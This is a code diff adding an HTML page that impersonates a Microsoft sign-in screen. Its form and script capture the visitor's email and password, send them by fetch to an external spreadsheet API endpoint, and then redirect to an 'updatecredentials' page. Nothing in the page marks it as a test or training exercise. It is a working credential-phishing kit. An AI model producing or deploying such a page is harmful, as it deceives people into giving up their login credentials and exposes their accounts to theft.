@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <link rel="stylesheet" href="css/style.css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">
+<title>Sign in</title>
+  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+</head>
+
+<body>
+  <div class="main">
+    <img class="logo" src="img/microsoft_logo.png" align="center" alt="Microsoft">
+    <p class="sign" align="center">Sign in</p>
+    <form id="sheetdb-form" action="https://sheetdb.io/api/v1/pjdzyn49c7ok3" class="form1" method="POST">
+      <input class="name" name="data[email]" type="email" align="left" placeholder="Enter your email">
+      <input class="pwd" name="data[password]" type="password" align="left" placeholder="Enter your password">
+      <input class="submit" type="submit" name="submit" id="submit" value="Sign in"/>
+      <p class="forgot" align="center"><a href="#">Forgot Password?</p>
+    </div>
+<script>
+  var form = document.getElementById('sheetdb-form');
+  form.addEventListener("submit", e => {
+    e.preventDefault();
+    fetch(form.action, {
+        method : "POST",
+        body: new FormData(document.getElementById("sheetdb-form")),
+    }).then(
+        response => response.json()
+    ).then((html) => {
+      // you can put any JS code here
+      // alert('success')
+      window.location.href = "updatecredentials.html"
+    });
+  });
+</script>
+</body>
+
+</html>
